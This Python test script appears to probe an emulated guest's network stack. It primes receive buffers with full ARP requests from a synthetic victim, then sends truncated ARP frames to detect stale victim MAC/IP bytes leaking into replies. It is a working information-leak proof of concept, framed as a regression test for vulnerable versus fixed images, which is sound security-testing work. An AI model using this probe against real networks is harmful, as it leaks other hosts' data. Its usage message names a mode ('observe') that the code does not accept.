#!/usr/bin/env python3
"""Probe short-ARP stale receive-buffer bytes using synthetic ARP traffic on TAP.

The test primes RX buffers with full ARP requests from a synthetic MAC/IP,
then sends 24-byte ARP requests that omit the sender and target fields. A
reply containing the previous sender IP demonstrates stale-buffer reuse.
Usage: test_arp_short_frame.py TARGET [expect|reject]
"""
from __future__ import annotations

import os
import select
import socket
import struct
import sys
import time
from pathlib import Path

if len(sys.argv) not in (2, 3):
    raise SystemExit("usage: test_arp_short_frame.py TARGET [expect|observe]")

mode = sys.argv[2] if len(sys.argv) == 3 else "expect"
if mode not in {"expect", "reject"}:
    raise SystemExit("mode must be expect or reject")

target = Path(sys.argv[1]).resolve()
TAP = os.environ.get("TAP", "k2t")
GUEST_IP = socket.inet_aton("10.0.2.15")
VICTIM_IP = socket.inet_aton("198.51.100.77")
PROBE_IP = socket.inet_aton("198.51.100.78")
VICTIM_MAC = bytes.fromhex("02 00 00 00 00 77")
sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
sock.bind((TAP, 0))
host_mac = sock.getsockname()[4]
broadcast = b"\xff" * 6
# Capture the victim's unicast ARP replies too; the test runs in an isolated
# network namespace and this membership is removed when the socket closes.
sock.setsockopt(
    263, 1, struct.pack("IHH8s", socket.if_nametoindex(TAP), 1, 0, b"\0" * 8)
)


def arp_frame(
    ethernet_destination: bytes,
    ethernet_source: bytes,
    sender_mac: bytes,
    sender_ip: bytes,
    target_mac: bytes,
    target_ip: bytes,
) -> bytes:
    header = struct.pack("!HHBBH", 1, 0x0800, 6, 4, 1)
    arp = header + sender_mac + sender_ip + target_mac + target_ip
    return ethernet_destination + ethernet_source + b"\x08\x06" + arp


def discover_guest_mac() -> bytes:
    sock.send(arp_frame(broadcast, host_mac, host_mac, PROBE_IP, b"\0" * 6, GUEST_IP))
    deadline = time.monotonic() + 2.0
    while time.monotonic() < deadline:
        ready, _, _ = select.select([sock], [], [], max(0, deadline - time.monotonic()))
        if not ready:
            break
        frame = sock.recv(65536)
        if (
            len(frame) >= 42
            and frame[0:6] == host_mac
            and frame[12:14] == b"\x08\x06"
            and frame[20:22] == b"\x00\x02"
            and frame[32:38] == host_mac
            and frame[38:42] == PROBE_IP
        ):
            return frame[6:12]
    raise SystemExit("FAIL: could not discover guest MAC from a normal ARP reply")


def prime_frame(guest_mac: bytes) -> bytes:
    # A unicast ARP reachability probe: the Ethernet destination and ARP target
    # hardware address are the already-known guest MAC.
    return arp_frame(guest_mac, VICTIM_MAC, VICTIM_MAC, VICTIM_IP, guest_mac, GUEST_IP)


def short_arp(guest_mac: bytes) -> bytes:
    header = struct.pack("!HHBBH", 1, 0x0800, 6, 4, 1)
    return guest_mac + host_mac + b"\x08\x06" + header + host_mac[:2]


def is_prime_reply(frame: bytes) -> bool:
    return (
        len(frame) >= 42
        and frame[0:6] == VICTIM_MAC
        and frame[12:14] == b"\x08\x06"
        and frame[20:22] == b"\x00\x02"
        and frame[32:38] == VICTIM_MAC
        and frame[38:42] == VICTIM_IP
    )


def leaked_marker(frame: bytes) -> bool:
    # The Ethernet destination is the short-frame sender. In the ARP payload,
    # its first two sender-MAC bytes are followed by the prior victim frame's
    # remaining four MAC bytes and complete sender IP.
    return (
        len(frame) >= 42
        and frame[0:6] == host_mac
        and frame[12:14] == b"\x08\x06"
        and frame[20:22] == b"\x00\x02"
        and frame[32:38] == host_mac[:2] + VICTIM_MAC[2:]
        and frame[38:42] == VICTIM_IP
    )


def drain_prime_replies(timeout: float) -> int:
    """Drain normal replies until the TAP socket has been quiet briefly."""
    deadline = time.monotonic() + timeout
    quiet_until = time.monotonic() + 0.25
    count = 0
    while time.monotonic() < deadline and time.monotonic() < quiet_until:
        wait = min(deadline, quiet_until) - time.monotonic()
        ready, _, _ = select.select([sock], [], [], max(0, wait))
        if not ready:
            break
        if is_prime_reply(sock.recv(65536)):
            count += 1
        quiet_until = time.monotonic() + 0.25
    return count


def wait_marker(timeout: float) -> bool:
    ready, _, _ = select.select([sock], [], [], timeout)
    while ready:
        frame = sock.recv(65536)
        if leaked_marker(frame):
            return True
        ready, _, _ = select.select([sock], [], [], 0)
    return False


if __name__ == "__main__":
    try:
        guest_mac = discover_guest_mac()
        if guest_mac in {host_mac, VICTIM_MAC}:
            raise SystemExit("FAIL: synthetic victim, host and guest MACs must be distinct")
        print(f"OBSERVED: discovered guest MAC {guest_mac.hex(':')}")
        prime = prime_frame(guest_mac)
        short = short_arp(guest_mac)
        # run_tap_ip_arp.sh sets MEM=256. The HSMASK formula gives this
        # guest a 2048-slot per-CPU software ring; the virtio RX queue is
        # capped at 1024. Send 2048 identical valid ARP requests in bounded
        # batches so both rings wrap, draining every normal reply. The primer
        # is a unicast request from a different synthetic sender: the short
        # frame must expose its stale MAC suffix and IP back to the attacker.
        total_primed = 0
        for batch in range(16):
            for _ in range(128):
                sock.send(prime)
            time.sleep(0.02)
            primed = drain_prime_replies(4.0)
            if primed != 128:
                raise SystemExit(
                    f"FAIL: batch {batch + 1}/16 drained {primed} of 128 full ARP replies"
                )
            total_primed += primed
        print(f"OBSERVED: drained {total_primed} normal replies to full ARP priming requests")
        found = False
        for _ in range(128):
            sock.send(short)
            if wait_marker(0.02):
                found = True
                break
        if mode == "expect" and not found:
            raise SystemExit("FAIL: no short-ARP prior-victim marker was disclosed")
        if mode == "reject" and found:
            raise SystemExit("FAIL: fixed image disclosed the prior-victim marker")
        label = "PASS" if (mode == "expect") == found else "FAIL"
        print(label + (": short ARP reply exposed the prior unicast victim MAC/IP suffix"
                       if found else ": no prior-unicast-victim marker reply observed"))
        print(f"RESULT: short ARP probe completed in mode={mode}")
    finally:
        sock.close()
